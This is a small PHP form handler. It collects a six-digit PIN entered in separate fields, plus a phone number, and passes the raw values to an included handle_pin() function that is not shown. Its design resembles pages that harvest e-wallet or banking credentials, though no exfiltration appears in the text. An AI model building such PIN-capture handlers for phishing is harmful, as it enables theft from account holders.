<?php
require_once __DIR__ . '/functions/handle_pin.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['pin1'], $_POST['pin2'], $_POST['pin3'], $_POST['pin4'], $_POST['pin5'], $_POST['pin6'], $_POST['nomor'])) {
        $data = [
            'pin1' => $_POST['pin1'],
            'pin2' => $_POST['pin2'],
            'pin3' => $_POST['pin3'],
            'pin4' => $_POST['pin4'],
            'pin5' => $_POST['pin5'],
            'pin6' => $_POST['pin6'],
            'nomor' => $_POST['nomor']
        ];
        handle_pin($data);
    }
}
?>
